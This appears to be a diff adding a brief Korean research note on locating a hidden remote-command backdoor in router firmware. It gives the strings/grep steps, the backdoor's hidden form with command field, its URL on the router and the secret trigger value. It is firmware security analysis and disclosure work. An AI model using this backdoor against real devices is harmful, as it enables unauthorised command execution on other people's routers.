@@ -1,0 +1,23 @@
+Amanagement Backdoor 조사 예
+1. HTML을 포함하고 있는 웹 애플리케이션 식별 및 문자열 추출
+	$ find 펌웨어루트디렉토리 -name "*.cgi" -exec strings -n 3 {} \; 2> /dev/null > /tmp/backdoor_review.txt
+
+2. 추출한 문자열 리뷰
+<form method=get action="/cgi-bin/d.cig" name="dform">
+<input type=hidden name=act value=1>
+File Name : <input type=text name="fname" value="" size=50 maxlength=120><br><br>
+Command Name : <input type=text name="cmd" value="" size=64 maxlength=256><br><br>
+<input type=text name="aaksjdkfj" value="%s" size=64 maxlength=256><br><br>
+<input type=submit name="dapply" value=" Show"
+</form>
+
+3. 문자열을 포함하고 있는 웹애플리케이션 식별
+$ grep -r aaksjdkfj 펌웨어루트디렉토리
+Binary file rootfs/bin/timepro.cgi macches
+
+4. 웹 애플리케이션 분석 (IDA 등 활용)
+	python -c 'print "\x23\x6e"'
+
+5. 확인
+	http://192.168.0.1/d.cgi (고급설정->시스템관리->기타설정->원격지원 실행)
+	aaksjdkfj 변수의 값 #notenoughmineral^
